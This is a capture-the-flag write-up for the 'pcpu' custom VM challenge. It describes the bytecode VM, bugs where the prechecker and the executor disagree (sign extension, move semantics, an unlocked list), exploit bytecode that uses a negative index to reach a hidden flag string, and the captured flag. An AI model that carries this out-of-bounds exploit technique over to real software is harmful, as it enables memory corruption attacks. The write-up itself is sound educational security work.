# pcpu

pcpu is a custom vm challenge where the program reads the bytecode, runs through the prechecker (written in python), and if prechecker exits without any error, then the command gets executed. The execution happens per cycle (an instruction per cycle) in something that looked like some different stages (of pipeline?) where each stage was run in a separate thread.

VM has 4 registers and the following opcodes:
```
0: mov dreg, imm16
1: mov dreg, sreg
2: alloc dreg, size16 ;; size is for precheck only. completely ignored during execution
3: mov [dreg, idx8], imm8
4: mov dreg, byte sreg[idx8]
5: mov [dreg, r0], imm8
6: mov dreg, byte sreg[r0]
7: print regs
```

Precheck will ensure that all registers accessed are valid and index `imm/r0` value is within the range of the size used to allocate that buffer size.

### `alloc` or `opcode 2`

`opcode 2` runs in the following manner:
  - It has a global array (size 4) of struct that it assigns from:
  ```
  {
    uint64_t is_free;
    uint8_t buf[0x10000];
  }
  ```
  - The struct is initialized to `is_free = 1` and first 8 bytes in buf is written to `(uint64_t)(rand() % 10)`. This is also done when free'd (or goes out of context as the register holding this value get overwritten).
  - During opcode execution, the program looks for a free struct, reads first 8 bytes of buf and copies a random string from the string table into the `buf`. The string table also has a pointer to flag, but that's at index `10` and thus not accessible because of `% 10` in normal execution.

### Bugs

There were multiple bugs spotted in the challenge as follows:
- Move semantics in precheck does not clear the source register to 0 but during execution, the source register is set to 0. Precheck also doesn't copy the size when moving a alloc'd register value.

- For opcode 3, prechecker checks the index length based on the register (`dreg`) it will be indexing into, however the execution engine will always index into `r0` irrespective of the opcode.

- For opcode 6, a `int8_t` value is read from `sreg[r0]` and then sign-extended to `int64_t` before saving to register. (opcode 4 probably has similar issue, but didn't confirm). This is not the case in the precheck.

- The code only holds a mutex lock while adding node to the list. This means we can potentially cause a race to happen between insert/remove and corrupt the list.


### Exploit

To exploit the challenge, we use the sign extend bug to create a negative index, and trick prechecker into thinking that we are indexing offset `0xf8` instead of `-8ull`. This allows to write mark an allocate struct as free (i.e., set bot `buf[0..8] = 10` and `is_free = 1`).

```
alloc r0, 0x200
set r0[0], 0xf8
set r0[1..7], 0xff

alloc r2, 0x200
mov r2, r0
mov r0, 0
mov r0, r2[r0]

mov r2[r0], 1
mov r3, r0

mov r2[r0], 10
alloc r1, 100

loop:
mov r0, {idx}
mov r0, r2[r0]
print_args # r0 has flag byte
jmp loop

```

**flag:** `codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138b045}`
